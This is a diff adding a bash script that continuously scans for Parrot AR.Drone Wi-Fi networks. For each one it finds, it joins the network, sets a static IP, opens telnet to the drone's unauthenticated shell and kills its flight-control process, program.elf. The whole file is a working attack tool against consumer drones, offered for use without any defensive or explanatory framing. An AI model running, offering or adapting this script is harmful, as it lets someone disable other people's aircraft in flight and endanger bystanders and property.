@@ -1,0 +1,39 @@
+#!/bin/bash
+
+while true; do
+                if ! ( iw wlan0 scan | grep SSID | awk '{print $2}' |  grep [a]rdrone ); then
+                        echo "No Drones Found"
+                else
+                        echo "Drone Found! Attempting to connect"
+                        DRONESSID=$(iw wlan0 scan | grep SSID | awk '{print $2}' | grep [a]rdrone)
+                        iwconfig wlan1 essid $DRONESSID
+                        sleep 2
+
+                        echo "Testing wireless Association"
+                        if ! ( iwconfig wlan1 | grep $DRONESSID ); then
+                                        echo "Association to $DRONESSID failed"
+                        else
+                                        echo "Association to $DRONESSID successful"
+
+                                        echo "Setting Static IP Address"
+                                        ifconfig wlan1 192.168.1.5 netmask 255.255.255.0 up
+                                        sleep 2
+
+                                        echo "Testing IP Connection"
+                                        if ! ( ping -c1 192.168.1.1 | grep from ); then
+                                                        echo "IP Connection Failed"
+                                        else
+                                                        echo "IP Connection Successful"
+                                                        echo "Connecting to Telnet and sending kill Command!!"
+                                                        empty -f -i /tmp/drone_input.fifo -o /tmp/drone_output.fifo -p /tmp/drone_empty.pid telnet 192.168.1.1
+                                                        empty -w -i /tmp/drone_output.fifo -o /tmp/drone_input.fifo BusyBox "kill -KILL \`pidof program.elf\`\n"
+                                                        kill `pidof empty`
+                                                        echo ""
+                                                        echo "Successful Drone killed"
+                                                        echo ""
+                                fi
+                           fi
+                        fi
+sleep 60
+done
+
